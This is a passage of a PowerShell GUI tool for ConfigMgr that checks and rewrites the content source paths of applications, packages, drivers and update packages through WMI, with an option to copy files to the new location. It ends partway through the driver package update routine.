﻿[CmdletBinding(SupportsShouldProcess=$true)]
param(
    [parameter(Mandatory=$true, HelpMessage="Specify the Primary Site server")]
    [ValidateNotNullOrEmpty()]
    [string]$SiteServer
)
Begin {
    
    try {
        $SiteCodeObjects = Get-WmiObject -Namespace "root\SMS" -Class SMS_ProviderLocation -ComputerName $SiteServer -ErrorAction Stop
        foreach ($SiteCodeObject in $SiteCodeObjects) {
            if ($SiteCodeObject.ProviderForLocalSite -eq $true) {
                $SiteCode = $SiteCodeObject.SiteCode
            }
        }
    }
    catch [System.UnauthorizedAccessException] {
	    Write-Warning -Message "Access denied" ; break
    }
    catch [System.Exception] {
	    Write-Warning -Message "Unable to determine Site Code" ; break
    }
    
    try {
        Add-Type -AssemblyName "System.Drawing" -ErrorAction Stop
        Add-Type -AssemblyName "System.Windows.Forms" -ErrorAction Stop
    }
    catch [System.UnauthorizedAccessException] {
	    Write-Warning -Message "Access denied when attempting to load required assemblies" ; break
    }
    catch [System.Exception] {
	    Write-Warning -Message "Unable to load required assemblies. Error message: $($_.Exception.Message) Line: $($_.InvocationInfo.ScriptLineNumber)" ; break
    }
}
Process {
    
    function Load-Form {
        $Form.Controls.AddRange(@(
            $ButtonStart,
            $ButtonValidate,
            $TextBoxMatch,
            $TextBoxReplace,
            $ComboBoxTypes,
            $CheckBoxCopyContent,
            $OutputBox,
            $DGVResults,
            $GBLog,
            $GBResults,
            $GBMatch,
            $GBReplace,
            $GBOptions,
            $GBActions,
            $StatusBar
        ))
	    $Form.Add_Shown({$Form.Activate()})
        $Form.Add_Shown({Load-Connect})
	    $Form.ShowDialog() | Out-Null
        $TextBoxMatch.Focus() | Out-Null
    }

    function Load-Connect {
        Write-OutputBox -OutputBoxMessage "Connected to Site server '$($SiteServer)' with Site Code '$($SiteCode)'" -Type INFO
    }

    function Invoke-CleanControls {
        param(
            [parameter(Mandatory=$true)]
            [ValidateSet("All","Log")]
            $Option
        )
        if ($Option -eq "All") {
            $DGVResults.Rows.Clear()
            $OutputBox.ResetText()
        }
        if ($Option -eq "Log") {
            $OutputBox.ResetText()
        }
    }

    function Write-OutputBox {
	    param(
	        [parameter(Mandatory=$true)]
	        [string]$OutputBoxMessage,
            [parameter(Mandatory=$true)]
	        [ValidateSet("WARNING","ERROR","INFO")]
	        [string]$Type
	    )
        Begin {
            $DateTime = (Get-Date).ToLongTimeString()
        }
	    Process {
		    if ($OutputBox.Text.Length -eq 0) {
			    $OutputBox.Text = "$($DateTime) - $($Type): $($OutputBoxMessage)"
			    [System.Windows.Forms.Application]::DoEvents()
                $OutputBox.SelectionStart = $OutputBox.Text.Length
                $OutputBox.ScrollToCaret()
		    }
		    else {
			    $OutputBox.AppendText("`n$($DateTime) - $($Type): $($OutputBoxMessage)")
			    [System.Windows.Forms.Application]::DoEvents()
                $OutputBox.SelectionStart = $OutputBox.Text.Length
                $OutputBox.ScrollToCaret()
		    }  
	    }
    }

    function Update-StatusBar {
        param(
	        [parameter(Mandatory=$true)]
            [ValidateSet("Ready","Updating","Validating","Enumerating")]
	        [string]$Activity,
	        [parameter(Mandatory=$true)]
	        [string]$Text
        )
        $StatusBarPanelActivity.Text = $Activity
        $StatusBarPanelProcessing.Text = $Text
        [System.Windows.Forms.Application]::DoEvents()
    }

    function Update-ApplicationContentSource {
        param(
            [parameter(Mandatory=$true)]
            [ValidateSet("Validate","Update")]
            [string]$Action,
            [parameter(Mandatory=$false)]
            [switch]$CopyFiles
        )
        Begin {
            try {
                Add-Type -Path (Join-Path -Path (Get-Item $env:SMS_ADMIN_UI_PATH).Parent.FullName -ChildPath "Microsoft.ConfigurationManagement.ApplicationManagement.dll") -ErrorAction Stop
                Add-Type -Path (Join-Path -Path (Get-Item $env:SMS_ADMIN_UI_PATH).Parent.FullName -ChildPath "Microsoft.ConfigurationManagement.ApplicationManagement.Extender.dll") -ErrorAction Stop
                Add-Type -Path (Join-Path -Path (Get-Item $env:SMS_ADMIN_UI_PATH).Parent.FullName -ChildPath "Microsoft.ConfigurationManagement.ApplicationManagement.MsiInstaller.dll") -ErrorAction Stop
            }
            catch [System.UnauthorizedAccessException] {
	            Write-OutputBox -OutputBoxMessage "Access denied when attempting to load ApplicationManagement dll's" -Type ERROR ; break
            }
            catch [System.Exception] {
	            Write-OutputBox -OutputBoxMessage "Unable to load required ApplicationManagement dll's. Make sure that you're running this tool on system where the ConfigMgr console is installed and that you're running the tool elevated" -Type ERROR ; break
            }
        }
        Process {
            if ($Action -eq "Validate") {
                $AppCount = 0
                Update-StatusBar -Activity Enumerating -Text " "
                $Applications = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_ApplicationLatest" -ComputerName $SiteServer
                $ApplicationCount = ($Applications | Measure-Object).Count
                foreach ($Application in $Applications) {
                    $AppCount++
                    $ApplicationName = $Application.LocalizedDisplayName
                    Update-StatusBar -Activity Validating -Text "Validating application $($AppCount) / $($ApplicationCount)"
                    if ($Application.HasContent -eq $true) {
                        
                        $Application.Get()
                        
                        $ApplicationXML = [Microsoft.ConfigurationManagement.ApplicationManagement.Serialization.SccmSerializer]::DeserializeFromString($Application.SDMPackageXML, $true)
                        foreach ($DeploymentType in $ApplicationXML.DeploymentTypes) {
                            $DeploymentTypeName = $DeploymentType.Title
                            $ExistingContentLocation = $DeploymentType.Installer.Contents[0].Location
                            if ($ExistingContentLocation -match [regex]::Escape($TextBoxMatch.Text)) {
                                $UpdatedContentLocation = $DeploymentType.Installer.Contents[0].Location -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                                $DGVResults.Rows.Add($true, $ApplicationName, $DeploymentTypeName, $ExistingContentLocation, $UpdatedContentLocation)
                                Write-OutputBox -OutputBoxMessage "Validated deployment type '$($DeploymentTypeName)' for application '$($ApplicationName)'" -Type INFO
                            }
                            else {
                                Write-OutputBox -OutputBoxMessage "Validation of deployment type '$($DeploymentTypeName)' for application '$($ApplicationName)' did not match the search pattern" -Type INFO
                            }
                        }
                        
                        [System.Windows.Forms.Application]::DoEvents()
                    }
                    else {
                        Write-OutputBox -OutputBoxMessage "Validation of application '$($ApplicationName)' detected that there was no associated content" -Type INFO
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed content source validation" -Type INFO
                if ($DGVResults.RowCount -ge 1) {
                    $ButtonStart.Enabled = $true
                }
            }
            if ($Action -eq "Update") {
                
                $AppCount = 0
                $AppRowCount = 0
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    if ($DGVResults.Rows[$RowIndex].Cells[0].Value -eq $true) {
                        $AppRowCount++
                    }
                }
                
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    $CellAppName = $DGVResults.Rows[$RowIndex].Cells[1].Value
                    $CellAppSelected = $DGVResults.Rows[$RowIndex].Cells[0].Value
                    if ($CellAppSelected -eq $true) {
                        $AppCount++
                        $Application = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_ApplicationLatest" -ComputerName $SiteServer -Filter "LocalizedDisplayName like '$($CellAppName)'"
                        if ($Application -ne $null) {
                            $ApplicationName = $Application.LocalizedDisplayName
                            Update-StatusBar -Activity Updating -Text "Updating application $($AppCount) / $($AppRowCount)"
                            
                            $Application.Get()
                            
                            $ApplicationXML = [Microsoft.ConfigurationManagement.ApplicationManagement.Serialization.SccmSerializer]::DeserializeFromString($Application.SDMPackageXML, $true)
                            foreach ($DeploymentType in $ApplicationXML.DeploymentTypes) {
                                $DeploymentTypeName = $DeploymentType.Title
                                $ExistingContentLocation = $DeploymentType.Installer.Contents[0].Location
                                if ($ExistingContentLocation -match [regex]::Escape($TextBoxMatch.Text)) {
                                    $UpdatedContentLocation = $DeploymentType.Installer.Contents[0].Location -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                                    
                                    if ($CopyFiles -eq $true) {
                                        if ($DeploymentType.Installer.Technology -eq "AppV") {
                                            $AmendUpdatedContentLocation = Split-Path -Path $UpdatedContentLocation -Parent
                                            if (-not(Test-Path -Path $AmendUpdatedContentLocation)) {
                                                New-Item -Path $AmendUpdatedContentLocation -ItemType Directory | Out-Null
                                            }
                                            if (Test-Path -Path $ExistingContentLocation) {
                                                $ExistingContentLocationItems = Get-ChildItem -Path $ExistingContentLocation
                                                Write-OutputBox -OutputBoxMessage "Copying content source files from $($ExistingContentLocation) to $($AmendUpdatedContentLocation)" -Type INFO
                                                foreach ($ExistingContentLocationItem in $ExistingContentLocationItems) {
                                                    Copy-Item -Path $ExistingContentLocationItem.FullName -Destination $AmendUpdatedContentLocation -Force -Recurse
                                                }
                                            }
                                            else {
                                                Write-OutputBox -OutputBoxMessage "Unable to access $($ExistingContentLocation)" -Type WARNING
                                            }
                                        }
                                        else {
                                            if (-not(Test-Path -Path $UpdatedContentLocation)) {
                                                New-Item -Path $UpdatedContentLocation -ItemType Directory | Out-Null
                                            }
                                            if (Test-Path -Path $ExistingContentLocation) {
                                                $ExistingContentLocationItems = Get-ChildItem -Path $ExistingContentLocation
                                                Write-OutputBox -OutputBoxMessage "Copying content source files from $($ExistingContentLocation) to $($UpdatedContentLocation)" -Type INFO
                                                foreach ($ExistingContentLocationItem in $ExistingContentLocationItems) {
                                                    Copy-Item -Path $ExistingContentLocationItem.FullName -Destination $UpdatedContentLocation -Force -Recurse
                                                }
                                            }
                                            else {
                                                Write-OutputBox -OutputBoxMessage "Unable to access $($ExistingContentLocation)" -Type WARNING
                                            }
                                        }
                                    }
                                    
                                    $ContentImporter = [Microsoft.ConfigurationManagement.ApplicationManagement.ContentImporter]::CreateContentFromFolder($UpdatedContentLocation)
                                    $DeploymentType.Installer.Contents[0].ID = $ContentImporter.ID
                                    $DeploymentType.Installer.Contents[0] = $ContentImporter
                                    
                                    $UpdatedXML = [Microsoft.ConfigurationManagement.ApplicationManagement.Serialization.SccmSerializer]::SerializeToString($ApplicationXML, $true)
                                    $Application.SDMPackageXML = $UpdatedXML
                                    $Application.Put() | Out-Null
                                    Write-OutputBox -OutputBoxMessage "Updated deployment type '$($DeploymentTypeName)' for application '$($ApplicationName)'" -Type INFO
                                    [System.Windows.Forms.Application]::DoEvents()
                                }
                            }
                        }
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed updating content sources" -Type INFO
                $ButtonStart.Enabled = $false
            }
        }
    }

    function Update-PackageContentSource {
        param(
            [parameter(Mandatory=$true)]
            [ValidateSet("Validate","Update")]
            [string]$Action,
            [parameter(Mandatory=$false)]
            [switch]$CopyFiles
        )
        Process {
            if ($Action -eq "Validate") {
                $PackageCount = 0
                Update-StatusBar -Activity Enumerating -Text " "
                $Packages = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_Package" -ComputerName $SiteServer
                $PackagesCount = ($Packages | Measure-Object).Count
                foreach ($Package in $Packages) {
                    $PackageCount++
                    $PackageName = $Package.Name
                    $PackageID = $Package.PackageID
                    Update-StatusBar -Activity Validating -Text "Validating package $($PackageCount) / $($PackagesCount)"
                    if ($Package.PkgSourcePath -ne $null) {
                        if ($Package.PkgSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                            $ExistingPackageSourcePath = $Package.PkgSourcePath
                            $UpdatedPackageSourcePath = $Package.PkgSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                            $DGVResults.Rows.Add($true, $PackageName, $ExistingPackageSourcePath, $UpdatedPackageSourcePath, $PackageID)
                            $DGVResults.ClearSelection()
                            Write-OutputBox -OutputBoxMessage "Successfully validated package '$($PackageName)'" -Type INFO
                            [System.Windows.Forms.Application]::DoEvents()
                        }
                        else {
                            Write-OutputBox -OutputBoxMessage "No matching content source for package '$($PackageName)' was found" -Type INFO
                        }
                    }
                    else {
                        Write-OutputBox -OutputBoxMessage "Validation of package '$($PackageName)' detected that there was no associated content" -Type INFO
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed content source validation" -Type INFO
                $ButtonStart.Enabled = $true
            }
            if ($Action -eq "Update") {
                
                $PackageCount = 0
                $PackageRowCount = 0
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    if ($DGVResults.Rows[$RowIndex].Cells[0].Value -eq $true) {
                        $PackageRowCount++
                    }
                }
                
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    $CellPackageName = $DGVResults.Rows[$RowIndex].Cells[1].Value
                    $CellPackageSelected = $DGVResults.Rows[$RowIndex].Cells[0].Value
                    $CellPackageID = $DGVResults.Rows[$RowIndex].Cells[4].Value
                    if ($CellPackageSelected -eq $true) {
                        $PackageCount++
                        $Package = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_Package" -ComputerName $SiteServer -Filter "PackageID like '$($CellPackageID)'"
                        if ($Package -ne $null) {
                            $PackageName = $Package.Name
                            Update-StatusBar -Activity Validating -Text "Updating package $($PackageCount) / $($PackageRowCount)"
                            [System.Windows.Forms.Application]::DoEvents()
                            if ($Package.PkgSourcePath -ne $null) {
                                if ($Package.PkgSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                                    $ExistingPackageSourcePath = $Package.PkgSourcePath
                                    $UpdatedPackageSourcePath = $Package.PkgSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                                    
                                    if ($CopyFiles -eq $true) {
                                        if (-not(Test-Path -Path $UpdatedPackageSourcePath)) {
                                            New-Item -Path $UpdatedPackageSourcePath -ItemType Directory | Out-Null
                                        }
                                        if ((Get-ChildItem -Path $UpdatedPackageSourcePath | Measure-Object).Count -eq 0) {
                                            if (Test-Path -Path $ExistingPackageSourcePath) {
                                                $ExistingPackageSourcePathItems = Get-ChildItem -Path $ExistingPackageSourcePath
                                                Write-OutputBox -OutputBoxMessage "Copying content source files from $($ExistingPackageSourcePath) to $($UpdatedPackageSourcePath)" -Type INFO
                                                foreach ($ExistingPackageSourcePathItem in $ExistingPackageSourcePathItems) {
                                                    Copy-Item -Path $ExistingPackageSourcePathItem.FullName -Destination $UpdatedPackageSourcePath -Force -Recurse
                                                }
                                            }
                                            else {
                                                Write-OutputBox -OutputBoxMessage "Unable to access $($ExistingPackageSourcePath)" -Type WARNING
                                            }
                                        }
                                    }
                                    
                                    $Package.PkgSourcePath = $UpdatedPackageSourcePath
                                    $Package.Put() | Out-Null
                                    $ValidatePackage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_Package" -ComputerName $SiteServer -Filter "PackageID like '$($CellPackageID)'"
                                    if ($ValidatePackage.PkgSourcePath -eq $UpdatedPackageSourcePath) {
                                        Write-OutputBox -OutputBoxMessage "Updated package '$($PackageName)'" -Type INFO
                                    }
                                    else {
                                        Write-OutputBox -OutputBoxMessage "An error occurred while updating package '$($PackageName)'" -Type ERROR
                                    }
                                    [System.Windows.Forms.Application]::DoEvents()
                                }
                                else {
                                    Write-OutputBox -OutputBoxMessage "No matching content source for package '$($PackageName)' was found" -Type INFO
                                }
                            }
                            else {
                                Write-OutputBox -OutputBoxMessage "Validation of package '$($PackageName)' detected that there was no associated content" -Type INFO
                            }
                        }
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed updating content sources" -Type INFO
                $ButtonStart.Enabled = $false
            }
        }
    }

    function Update-DeploymentPackageContentSource {
        param(
            [parameter(Mandatory=$true)]
            [ValidateSet("Validate","Update")]
            [string]$Action,
            [parameter(Mandatory=$false)]
            [switch]$CopyFiles
        )
        Process {
            if ($Action -eq "Validate") {
                $DeploymentPackageCount = 0
                Update-StatusBar -Activity Enumerating -Text " "
                $DeploymentPackages = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_SoftwareUpdatesPackage" -ComputerName $SiteServer
                $DeploymentPackagesCount = ($DeploymentPackages | Measure-Object).Count
                foreach ($DeploymentPackage in $DeploymentPackages) {
                    $DeploymentPackageCount++
                    $DeploymentPackageName = $DeploymentPackage.Name
                    $DeploymentPackageID = $DeploymentPackage.PackageID
                    Update-StatusBar -Activity Validating -Text "Validating deployment package $($DeploymentPackageCount) / $($DeploymentPackagesCount)"
                    if ($DeploymentPackage.PkgSourcePath -ne $null) {
                        if ($DeploymentPackage.PkgSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                            $ExistingDeploymentPackageSourcePath = $DeploymentPackage.PkgSourcePath
                            $UpdatedDeploymentPackageSourcePath = $DeploymentPackage.PkgSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                            $DGVResults.Rows.Add($true, $DeploymentPackageName, $ExistingDeploymentPackageSourcePath, $UpdatedDeploymentPackageSourcePath, $DeploymentPackageID)
                            Write-OutputBox -OutputBoxMessage "Successfully validated deployment package '$($DeploymentPackageName)'" -Type INFO
                            [System.Windows.Forms.Application]::DoEvents()
                        }
                        else {
                            Write-OutputBox -OutputBoxMessage "No matching content source for deployment package '$($DeploymentPackageName)' was found" -Type INFO
                        }
                    }
                    else {
                        Write-OutputBox -OutputBoxMessage "Validation of deployment package '$($DeploymentPackageName)' detected that there was no associated content" -Type INFO
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed content source validation" -Type INFO
                $ButtonStart.Enabled = $true
            }
            if ($Action -eq "Update") {
                
                $DeploymentPackageCount = 0
                $DeploymentPackageRowCount = 0
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    if ($DGVResults.Rows[$RowIndex].Cells[0].Value -eq $true) {
                        $DeploymentPackageRowCount++
                    }
                }
                
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    $CellDeploymentPackageName = $DGVResults.Rows[$RowIndex].Cells[1].Value
                    $CellDeploymentPackageSelected = $DGVResults.Rows[$RowIndex].Cells[0].Value
                    $CellDeploymentPackageID = $DGVResults.Rows[$RowIndex].Cells[4].Value
                    if ($CellDeploymentPackageSelected -eq $true) {
                        $DeploymentPackageCount++
                        $DeploymentPackage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_SoftwareUpdatesPackage" -ComputerName $SiteServer -Filter "PackageID like '$($CellDeploymentPackageID)'"
                        if ($DeploymentPackage -ne $null) {
                            $DeploymentPackageName = $DeploymentPackage.Name
                            Update-StatusBar -Activity Validating -Text "Updating package $($DeploymentPackageCount) / $($DeploymentPackageRowCount)"
                            [System.Windows.Forms.Application]::DoEvents()
                            if ($DeploymentPackage.PkgSourcePath -ne $null) {
                                if ($DeploymentPackage.PkgSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                                    $ExistingDeploymentPackageSourcePath = $DeploymentPackage.PkgSourcePath
                                    $UpdatedDeploymentPackageSourcePath = $DeploymentPackage.PkgSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                                    
                                    if ($CopyFiles -eq $true) {
                                        if (-not(Test-Path -Path $UpdatedDeploymentPackageSourcePath)) {
                                            New-Item -Path $UpdatedDeploymentPackageSourcePath -ItemType Directory | Out-Null
                                        }
                                        if ((Get-ChildItem -Path $UpdatedDeploymentPackageSourcePath | Measure-Object).Count -eq 0) {
                                            if (Test-Path -Path $ExistingDeploymentPackageSourcePath) {
                                                $ExistingDeploymentPackageSourcePathItems = Get-ChildItem -Path $ExistingDeploymentPackageSourcePath
                                                Write-OutputBox -OutputBoxMessage "Copying content source files from $($ExistingDeploymentPackageSourcePath) to $($UpdatedDeploymentPackageSourcePath)" -Type INFO
                                                foreach ($ExistingDeploymentPackageSourcePathItem in $ExistingDeploymentPackageSourcePathItems) {
                                                    Copy-Item -Path $ExistingDeploymentPackageSourcePathItem.FullName -Destination $UpdatedDeploymentPackageSourcePath -Force -Recurse
                                                }
                                            }
                                            else {
                                                Write-OutputBox -OutputBoxMessage "Unable to access $($ExistingDeploymentPackageSourcePath)" -Type WARNING
                                            }
                                        }
                                    }
                                    
                                    $DeploymentPackage.PkgSourcePath = $UpdatedDeploymentPackageSourcePath
                                    $DeploymentPackage.Put() | Out-Null
                                    $ValidateDeploymentPackage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_SoftwareUpdatesPackage" -ComputerName $SiteServer -Filter "PackageID like '$($CellDeploymentPackageID)'"
                                    if ($ValidateDeploymentPackage.PkgSourcePath -eq $UpdatedDeploymentPackageSourcePath) {
                                        Write-OutputBox -OutputBoxMessage "Updated deployment package '$($DeploymentPackageName)'" -Type INFO
                                    }
                                    else {
                                        Write-OutputBox -OutputBoxMessage "An error occurred while updating deployment package '$($DeploymentPackageName)'" -Type ERROR
                                    }
                                    [System.Windows.Forms.Application]::DoEvents()
                                }
                                else {
                                    Write-OutputBox -OutputBoxMessage "No matching content source for package '$($DeploymentPackageName)' was found" -Type INFO
                                }
                            }
                            else {
                                Write-OutputBox -OutputBoxMessage "Validation of package '$($DeploymentPackageName)' detected that there was no associated content" -Type INFO
                            }
                        }
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed updating content sources" -Type INFO
                $ButtonStart.Enabled = $false
            }
        }
    }

    function Update-DriverContentSource {
        param(
            [parameter(Mandatory=$true)]
            [ValidateSet("Validate","Update")]
            [string]$Action,
            [parameter(Mandatory=$false)]
            [switch]$CopyFiles
        )
        Process {
            if ($Action -eq "Validate") {
                $DriverCount = 0
                Update-StatusBar -Activity Enumerating -Text " "
                $Drivers = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_Driver" -ComputerName $SiteServer
                $DriversCount = ($Drivers | Measure-Object).Count
                foreach ($Driver in $Drivers) {
                    $DriverCount++
                    $DriverName = $Driver.LocalizedDisplayName
                    $DriverCIID = $Driver.CI_ID
                    Update-StatusBar -Activity Validating -Text "Validating driver $($DriverCount) / $($DriversCount)"
                    if ($Driver.ContentSourcePath -ne $null) {
                        if ($Driver.ContentSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                            $ExistingDriverSourcePath = $Driver.ContentSourcePath
                            $UpdatedDriverSourcePath = $Driver.ContentSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                            $DGVResults.Rows.Add($true, $DriverName, $ExistingDriverSourcePath, $UpdatedDriverSourcePath, $DriverCIID)
                            Write-OutputBox -OutputBoxMessage "Successfully validated driver '$($DriverName)'" -Type INFO
                            [System.Windows.Forms.Application]::DoEvents()
                        }
                        else {
                            Write-OutputBox -OutputBoxMessage "No matching content source for driver '$($DriverName)' was found" -Type INFO
                        }
                    }
                    else {
                        Write-OutputBox -OutputBoxMessage "Validation of driver '$($DriverName)' detected that there was no associated content" -Type INFO
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed content source validation" -Type INFO
                $ButtonStart.Enabled = $true
            }
            if ($Action -eq "Update") {
                
                $DriverCount = 0
                $DriverRowCount = 0
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    if ($DGVResults.Rows[$RowIndex].Cells[0].Value -eq $true) {
                        $DriverRowCount++
                    }
                }
                
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    $CellDriverName = $DGVResults.Rows[$RowIndex].Cells[1].Value
                    $CellDriverSelected = $DGVResults.Rows[$RowIndex].Cells[0].Value
                    $CellDriverCIID = $DGVResults.Rows[$RowIndex].Cells[4].Value
                    if ($CellDriverSelected -eq $true) {
                        $DriverCount++
                        $Driver = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_Driver" -ComputerName $SiteServer -Filter "CI_ID like '$($CellDriverCIID)'"
                        if ($Driver -ne $null) {
                            $DriverName = $Driver.LocalizedDisplayName
                            Update-StatusBar -Activity Validating -Text "Updating driver $($DriverCount) / $($DriverRowCount)"
                            [System.Windows.Forms.Application]::DoEvents()
                            if ($Driver.ContentSourcePath -ne $null) {
                                if ($Driver.ContentSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                                    $ExistingDriverSourcePath = $Driver.ContentSourcePath
                                    $UpdatedDriverSourcePath = $Driver.ContentSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                                    
                                    if ($CopyFiles -eq $true) {
                                        if (-not(Test-Path -Path $UpdatedDriverSourcePath)) {
                                            New-Item -Path $UpdatedDriverSourcePath -ItemType Directory | Out-Null
                                        }
                                        if ((Get-ChildItem -Path $UpdatedDriverSourcePath | Measure-Object).Count -eq 0) {
                                            if (Test-Path -Path $ExistingDriverSourcePath) {
                                                $ExistingDriverSourcePathItems = Get-ChildItem -Path $ExistingDriverSourcePath
                                                Write-OutputBox -OutputBoxMessage "Copying content source files from $($ExistingDriverSourcePath) to $($UpdatedDriverSourcePath)" -Type INFO
                                                foreach ($ExistingDriverSourcePathItem in $ExistingDriverSourcePathItems) {
                                                    Copy-Item -Path $ExistingDriverSourcePathItem.FullName -Destination $UpdatedDriverSourcePath -Force -Recurse
                                                }
                                            }
                                            else {
                                                Write-OutputBox -OutputBoxMessage "Unable to access $($ExistingDriverSourcePath)" -Type WARNING
                                            }
                                        }
                                    }
                                    
                                    $Driver.ContentSourcePath = $UpdatedDriverSourcePath
                                    $Driver.Put() | Out-Null
                                    $ValidateDriver = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_Driver" -ComputerName $SiteServer -Filter "CI_ID like '$($CellDriverCIID)'"
                                    if ($ValidateDriver.ContentSourcePath -eq $UpdatedDriverSourcePath) {
                                        Write-OutputBox -OutputBoxMessage "Updated driver '$($DriverName)'" -Type INFO
                                    }
                                    else {
                                        Write-OutputBox -OutputBoxMessage "An error occurred while updating driver '$($DriverName)'" -Type ERROR
                                    }
                                    [System.Windows.Forms.Application]::DoEvents()
                                }
                                else {
                                    Write-OutputBox -OutputBoxMessage "No matching content source for driver '$($DriverName)' was found" -Type INFO
                                }
                            }
                            else {
                                Write-OutputBox -OutputBoxMessage "Validation of driver '$($DriverName)' detected that there was no associated content" -Type INFO
                            }
                        }
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed updating content sources" -Type INFO
                $ButtonStart.Enabled = $false
            }
        }
    }

    function Update-DriverPackageContentSource {
        param(
            [parameter(Mandatory=$true)]
            [ValidateSet("Validate","Update")]
            [string]$Action,
            [parameter(Mandatory=$false)]
            [switch]$CopyFiles
        )
        Process {
            if ($Action -eq "Validate") {
                $DriverPackageCount = 0
                Update-StatusBar -Activity Enumerating -Text " "
                $DriverPackages = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_DriverPackage" -ComputerName $SiteServer
                $DriverPackagesCount = ($DriverPackages | Measure-Object).Count
                foreach ($DriverPackage in $DriverPackages) {
                    $DriverPackageCount++
                    $DriverPackageName = $DriverPackage.Name
                    $DriverPackageID = $DriverPackage.PackageID
                    Update-StatusBar -Activity Validating -Text "Validating driver package $($DriverPackageCount) / $($DriverPackagesCount)"
                    if ($DriverPackage.PkgSourcePath -ne $null) {
                        if ($DriverPackage.PkgSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                            $ExistingDriverPackageSourcePath = $DriverPackage.PkgSourcePath
                            $UpdatedDriverPackageSourcePath = $DriverPackage.PkgSourcePath -replace [regex]::Escape($TextBoxMatch.Text), $TextBoxReplace.Text
                            $DGVResults.Rows.Add($true, $DriverPackageName, $ExistingDriverPackageSourcePath, $UpdatedDriverPackageSourcePath, $DriverPackageID)
                            Write-OutputBox -OutputBoxMessage "Successfully validated driver package '$($DriverPackageName)'" -Type INFO
                            [System.Windows.Forms.Application]::DoEvents()
                        }
                        else {
                            Write-OutputBox -OutputBoxMessage "No matching content source for driver package '$($DriverPackageName)' was found" -Type INFO
                        }
                    }
                    else {
                        Write-OutputBox -OutputBoxMessage "Validation of driver package '$($DriverPackageName)' detected that there was no associated content" -Type INFO
                    }
                }
                Update-StatusBar -Activity Ready -Text " "
                Write-OutputBox -OutputBoxMessage "Completed content source validation" -Type INFO
                $ButtonStart.Enabled = $true
            }
            if ($Action -eq "Update") {
                
                $DriverPackageCount = 0
                $DriverPackageRowCount = 0
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    if ($DGVResults.Rows[$RowIndex].Cells[0].Value -eq $true) {
                        $DriverPackageRowCount++
                    }
                }
                
                for ($RowIndex = 0; $RowIndex -lt $DGVResults.RowCount; $RowIndex++) {
                    $CellDriverPackageName = $DGVResults.Rows[$RowIndex].Cells[1].Value
                    $CellDriverPackageSelected = $DGVResults.Rows[$RowIndex].Cells[0].Value
                    $CellDriverPackageID = $DGVResults.Rows[$RowIndex].Cells[4].Value
                    if ($CellDriverPackageSelected -eq $true) {
                        $DriverPackageCount++
                        $DriverPackage = Get-WmiObject -Namespace "root\SMS\site_$($SiteCode)" -Class "SMS_DriverPackage" -ComputerName $SiteServer -Filter "PackageID like '$($CellDriverPackageID)'"
                        if ($DriverPackage -ne $null) {
                            $DriverPackageName = $DriverPackage.Name
                            Update-StatusBar -Activity Validating -Text "Updating driver package $($DriverPackageCount) / $($DriverPackageRowCount)"
                            [System.Windows.Forms.Application]::DoEvents()
                            if ($DriverPackage.PkgSourcePath -ne $null) {
                                if ($DriverPackage.PkgSourcePath -match [regex]::Escape($TextBoxMatch.Text)) {
                                    $ExistingDriverPackageSourcePath = $DriverPackage.PkgSourcePath
